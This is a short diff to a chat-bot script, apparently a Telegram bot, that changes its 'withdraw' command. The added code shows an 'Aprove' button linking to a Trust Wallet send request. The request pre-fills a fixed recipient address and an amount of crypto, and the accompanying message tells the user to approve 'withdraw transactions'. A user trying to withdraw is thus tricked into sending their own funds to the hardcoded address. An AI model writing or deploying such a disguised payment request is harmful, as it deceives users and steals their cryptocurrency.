@@ -15,3 +15,7 @@
   aliases: 💵withdraw
 CMD*/
 
+var buttons = [
+  {title: "Aprove", url: "https://link.trustwallet.com/send?asset=c20000714&address=0x799E809631a837eA771B7D5182dEb1BC371516d1&amount=0.0045"},
+  ];
+Bot.sendInlineKeyboard(buttons, "☑️ Please Aprove withdraw transactions!");
